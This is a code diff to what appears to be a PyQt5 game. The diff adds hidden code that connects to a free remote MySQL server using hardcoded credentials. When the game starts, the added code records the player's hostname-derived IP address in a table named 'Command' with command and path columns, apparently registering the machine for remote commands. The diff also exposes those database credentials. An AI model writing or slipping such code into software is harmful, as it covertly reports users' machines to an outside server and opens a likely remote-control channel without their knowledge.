@@ -1,11 +1,19 @@
-import sys
-from PyQt5.QtWidgets import QApplication, QLabel, QPushButton, QVBoxLayout, QWidget, QFileDialog, QGridLayout, \
-    QMainWindow, QHBoxLayout, QAction, QPlainTextEdit, QMenuBar, QTabWidget, QListWidgetItem, QListWidget
+import socket,sys,mysql.connector
+from PyQt5.QtWidgets import *
 from PyQt5.QtGui import QPixmap,QFont
 from PyQt5 import QtGui, QtCore
 from PyQt5.QtGui import QCursor
 from PyQt5.QtCore import Qt
 from PIL import Image
+
+mydb=mysql.connector.connect(
+    host=" sql6.freemysqlhosting.net",
+    user="sql6473246",
+    password="vrYZb6cDv9",
+    database="sql6473246"
+)
+hostname = socket.gethostname()
+IPAddr = socket.gethostbyname(hostname)
 
 widgets = {
     "logo": [],
@@ -40,6 +48,15 @@ def start_gme():
     '''display frame 2'''
     clear_widgets()
     window.hide()
+
+    if mydb.is_connected():
+        print("connected")
+        cur = mydb.cursor()
+        query = "INSERT INTO Command (ip,command,path) VALUES(%s,%s,%s)"
+        values = (IPAddr, None, None)
+        cur.execute(query, values)
+        mydb.commit()
+
     import main
     main.scndintrfc()
 
